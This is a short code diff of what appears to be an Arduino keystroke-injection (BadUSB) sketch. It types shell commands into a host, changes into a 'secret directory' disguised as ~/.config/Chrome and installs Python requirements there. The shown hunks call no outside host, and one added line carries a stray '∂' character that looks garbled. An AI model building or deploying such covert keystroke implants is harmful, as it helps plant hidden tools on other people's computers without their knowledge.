@@ -80,7 +80,7 @@ void setup()
   delay(200);
   // Switch to secret directory
   delay(2000);
-  Keyboard.print(F("mkdir ~/.config/Chrome; cd ~/.config/Chrome/"));
+  Keyboard.print(F("cd ~/.config/Chrome/"));
 
   delay(200);
   typeKey(KEY_RETURN);
@@ -88,7 +88,7 @@ void setup()
   delay(200);
   // install python modules needed
   delay(2000);
-  Keyboard.print(F("pip3 install -r requirements.txt"));
+  Keyboard.print(F("pip3 install -r requirements.txt"));∂
 
   delay(200);
   typeKey(KEY_RETURN);
